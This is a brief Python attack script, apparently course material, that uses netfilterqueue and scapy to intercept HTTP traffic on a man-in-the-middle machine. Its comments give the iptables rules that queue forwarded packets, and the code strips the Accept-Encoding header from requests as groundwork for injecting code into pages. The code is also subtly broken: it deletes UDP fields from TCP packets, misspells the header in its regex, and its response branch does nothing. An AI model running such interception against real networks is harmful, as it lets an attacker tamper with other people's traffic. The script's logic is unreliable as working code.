#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

# usable ONLY with HTTP connections
# service apache2 start - START BUILT IN WEB SERVER
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables --flush


def set_load(packet, load):
    packet[scapy.Raw].load = load

    # remove chksum & len to maintain packet integrity (will be recalculated automatically by scapy)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].chksum
    del packet[scapy.UDP].len

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP Request")
            print("[+] Request")
            # remove encoding from the request, so that server sends unencoded HTML
            modified_load = re.sub("Accept encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)

            # set payload to the initial packet
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            # print("HTTP Response")
            print("[+] Request")

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()